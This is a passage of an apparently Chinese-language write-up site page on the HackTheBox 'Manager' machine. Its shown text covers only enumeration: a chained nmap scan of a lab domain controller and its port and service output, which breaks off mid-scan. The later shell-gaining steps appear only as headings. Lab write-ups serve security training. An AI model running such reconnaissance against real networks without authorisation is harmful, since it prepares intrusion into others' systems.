@@ -1,0 +1,1203 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Gofer/">
+      
+      
+        <link rel="next" href="../Rebound/">
+      
+      
+      <link rel="icon" href="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.2">
+    
+    
+      
+        <title>Manager - Write-up</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#manager" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Write-up" class="md-header__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Write-up
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Manager
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  HackTheBox
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Write-up" class="md-nav__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    Write-up
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Crypto
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Crypto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Crypto/VeryEasy-BabyEncryption/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - BabyEncryption
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Web
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Web/Easy-ProxyAsAService/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Easy-ProxyAsAService
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Appsanity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Appsanity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Codify/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Codify
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Download/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Download
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Gofer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hard - Gofer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell-as-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as mssql
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-as-maven" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as maven
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-as-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as SYSTEM
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Rebound/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rebound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Visual/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Visual
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sherlocks
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Sherlocks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/OpTinselTrace-1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpTinselTrace-1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/TickTock/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    TickTock
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="manager">Manager</h1>
+<p><img alt="Manager" src="../assets/202310261511328.png" /></p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-sh highlight"><pre><span></span><code><span class="c1"># IP=&#39;10.10.11.236&#39;; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep &#39;/tcp\|/udp&#39; | awk -F &#39;/&#39; &#39;{print $1}&#39; | tr &#39;\n&#39; &#39;,&#39;) $IP -oN nmap.txt</span>
+
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.236
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.13s<span class="w"> </span>latency<span class="o">)</span>.
+
+PORT<span class="w">      </span>STATE<span class="w">    </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">     </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">     </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+<span class="p">|</span>_http-title:<span class="w"> </span>Manager
+<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">     </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2023</span>-10-26<span class="w"> </span><span class="m">07</span>:34:04Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">     </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">     </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>manager.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-26T07:35:39+00:00<span class="p">;</span><span class="w"> </span>+7h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-07-30T13:51:28
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2024</span>-07-29T13:51:28
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">     </span>microsoft-ds?
+<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">     </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">     </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">     </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>manager.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-07-30T13:51:28
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2024</span>-07-29T13:51:28
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-26T07:35:38+00:00<span class="p">;</span><span class="w"> </span>+7h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">1433</span>/tcp<span class="w">  </span>open<span class="w">     </span>ms-sql-s<span class="w">      </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="m">15</span>.00.2000.00<span class="p">;</span><span class="w"> </span>RTM
+<span class="p">|</span>_ms-sql-info:<span class="w"> </span>ERROR:<span class="w"> </span>Script<span class="w"> </span>execution<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>use<span class="w"> </span>-d<span class="w"> </span>to<span class="w"> </span>debug<span class="o">)</span>
+<span class="p">|</span>_ms-sql-ntlm-info:<span class="w"> </span>ERROR:<span class="w"> </span>Script<span class="w"> </span>execution<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>use<span class="w"> </span>-d<span class="w"> </span>to<span class="w"> </span>debug<span class="o">)</span>
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-26T07:35:39+00:00<span class="p">;</span><span class="w"> </span>+7h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-10-25T20:54:34
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2053</span>-10-25T20:54:34
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">     </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>manager.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-07-30T13:51:28
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2024</span>-07-29T13:51:28
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-26T07:35:39+00:00<span class="p">;</span><span class="w"> </span>+7h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">     </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>manager.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:dc01.manager.htb
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-07-30T13:51:28
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2024</span>-07-29T13:51:28
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2023</span>-10-26T07:35:38+00:00<span class="p">;</span><span class="w"> </span>+7h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">     </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">     </span>mc-nmf<span class="w">        </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49687</span>/tcp<span class="w"> </span>open<span class="w">     </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49688</span>/tcp<span class="w"> </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49689</span>/tcp<span class="w"> </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49726</span>/tcp<span class="w"> </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">51064</span>/tcp<span class="w"> </span>filtered<span class="w"> </span>unknown
+<span class="m">61595</span>/tcp<span class="w"> </span>open<span class="w">     </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+OS<span class="w"> </span>fingerprint<span class="w"> </span>not<span class="w"> </span>ideal<span class="w"> </span>because:<span class="w"> </span>Missing<span class="w"> </span>a<span class="w"> </span>closed<span class="w"> </span>TCP<span class="w"> </span>port<span class="w"> </span>so<span class="w"> </span>results<span class="w"> </span>incomplete
+No<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC01<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>6h59m59s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>6h59m59s
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
